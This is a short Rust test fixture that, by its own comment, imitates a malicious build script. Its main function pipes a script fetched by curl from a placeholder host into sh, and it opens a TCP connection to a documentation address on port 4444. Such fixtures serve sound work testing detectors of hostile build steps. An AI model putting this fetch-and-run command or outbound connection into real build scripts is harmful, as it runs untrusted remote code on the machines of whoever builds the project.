// TEST FIXTURE: imitates a malicious build script. Never compiled or run.
use std::process::Command;

fn main() {
    let _ = Command::new("sh")
        .arg("-c")
        .arg("curl https://x.example.invalid/p.sh | sh")
        .status();
    let _ = std::net::TcpStream::connect("203.0.113.9:4444");
}
